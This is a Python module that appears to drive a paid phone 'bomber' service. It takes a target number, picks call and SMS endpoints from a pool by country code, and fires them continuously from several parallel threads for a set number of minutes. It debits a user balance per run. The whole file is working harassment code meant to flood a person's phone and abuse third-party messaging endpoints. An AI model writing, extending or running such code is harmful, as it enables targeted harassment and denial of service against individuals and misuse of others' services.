import time, random, threading, re
import state, endpoints

_NANP = re.compile(r"^\+?1[2-9]\d{9}$")

def _cc_of(phone):
    p = (phone or "").lstrip("+")
    # NANP (US/Canada) -> "us" so pool entries tagged _cc="us" are selected.
    if _NANP.match(p):
        return "us"
    if len(p) > 10:
        return p[:4]
    return p[:1]

def _select(pool, kind, cc):
    # Prefer multi/international + cc-matched endpoints; fall back to all.
    cands = [e for e in pool if e.kind in (kind, "both") and e.cc in ("multi", cc)]
    active = [e for e in cands if not e.cooling()] or cands
    if not active:
        active = [e for e in pool if e.kind in (kind, "both") and not e.cooling()] or pool
    return random.choice(active) if active else None

def _fire(bomb):
    pool = endpoints.get_pool()
    cc = bomb.get("cc") or _cc_of(bomb["phone"])
    if bomb["mode"] in ("call", "both"):
        ep = _select(pool, "call", cc)
        if ep:
            if ep.call(bomb["phone"]):
                bomb["calls"] += 1
    if bomb["mode"] in ("sms", "both"):
        ep = _select(pool, "sms", cc)
        if ep:
            if ep.sms(bomb["phone"], bomb.get("text") or ""):
                bomb["sms"] += 1

def _fire_once(bid):
    b = state.get_bomb(bid)
    if b and b["running"]:
        _fire(b)

def _run(bomb):
    bid = bomb["id"]
    end = time.time() + bomb["minutes"] * 60
    interval = bomb.get("interval", 0.5)
    workers = max(2, min(8, bomb.get("workers", 5)))
    # Fire continuously from N parallel workers until stop/timeout. Each worker
    # loops: fire -> short jitter. This saturates the endpoint pool (non-stop).
    def worker():
        while True:
            b = state.get_bomb(bid)
            if not b or not b["running"] or time.time() >= end:
                return
            _fire(b)
            time.sleep(max(0.02, interval * random.uniform(0.2, 0.8)))
    ts = []
    for _ in range(workers):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ts.append(t)
    for t in ts:
        t.join()
    b = state.get_bomb(bid)
    if b:
        b["running"] = False
        b["finished"] = time.time()

def start(uid, phone, minutes, mode, interval=0.5, text="", cost=0.0):
    if cost > 0 and not state.debit(uid, cost):
        return {"ok": False, "err": "Insufficient balance"}
    bid = "%s_%d_%d" % (uid, int(time.time()), random.randint(1000, 9999))
    bomb = {"id": bid, "user": str(uid), "phone": phone, "minutes": minutes,
            "mode": mode, "interval": interval, "text": text, "cc": _cc_of(phone),
            "calls": 0, "sms": 0, "running": True,
            "started": time.time(), "finished": None}
    state.add_bomb(bomb)
    threading.Thread(target=_run, args=(bomb,), daemon=True).start()
    return {"ok": True, "bomb": bomb}

def stop(uid):
    n = 0
    for b in state.user_bombs(uid):
        if b["running"]:
            b["running"] = False
            n += 1
    return n
